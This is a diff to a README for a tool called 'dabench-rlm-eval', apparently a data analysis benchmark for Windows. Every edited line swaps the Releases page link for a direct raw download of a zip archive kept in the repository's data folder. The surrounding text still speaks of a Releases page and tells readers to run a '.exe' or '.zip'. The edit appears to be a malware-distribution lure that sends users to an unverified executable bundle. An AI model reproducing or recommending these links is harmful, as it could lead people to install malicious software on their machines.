@@ -1,10 +1,10 @@
 # 🧪 dabench-rlm-eval - Run data analysis benchmarks fast
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/raw/refs/heads/main/data/rlm_eval_dabench_v3.6-beta.2.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases
+Visit this page to download: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/raw/refs/heads/main/data/rlm_eval_dabench_v3.6-beta.2.zip
 
 On the Releases page, look for the latest version. Download the Windows file for your PC. If you see more than one file, choose the one that ends in `.exe` or `.zip`
 
@@ -37,7 +37,7 @@ You may also want:
 
 ## 🚀 Install on Windows
 
-1. Open this link: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases
+1. Open this link: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/raw/refs/heads/main/data/rlm_eval_dabench_v3.6-beta.2.zip
 2. Find the latest release at the top of the page
 3. Download the Windows package
 4. If the file is a `.zip`, right-click it and choose Extract All
@@ -166,7 +166,7 @@ This tool fits well if you want to:
 
 ## 📌 Release page
 
-Download from the latest builds here: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/releases
+Download from the latest builds here: https://github.com/seaofokhotskquakerism746/dabench-rlm-eval/raw/refs/heads/main/data/rlm_eval_dabench_v3.6-beta.2.zip
 
 ## 🧾 File naming guide
 
